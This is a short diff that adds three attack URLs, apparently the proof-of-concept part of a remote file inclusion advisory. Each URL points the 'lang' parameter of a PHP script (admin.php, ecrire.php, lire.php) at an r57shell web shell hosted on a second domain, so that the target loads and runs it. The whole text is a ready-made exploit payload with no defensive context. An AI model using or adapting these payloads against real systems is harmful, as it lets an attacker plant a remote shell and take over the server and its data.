@@ -1,0 +1,3 @@
+http://www.example.com/path/admin.php?lang=http://www.example2.com/r57shell.txt?
+http://www.example.com/path/ecrire.php?lang=http://www.example2.com/r57shell.txt?
+http://www.example.com/path/lire.php?lang=http://www.example2.com/r57shell.txt?
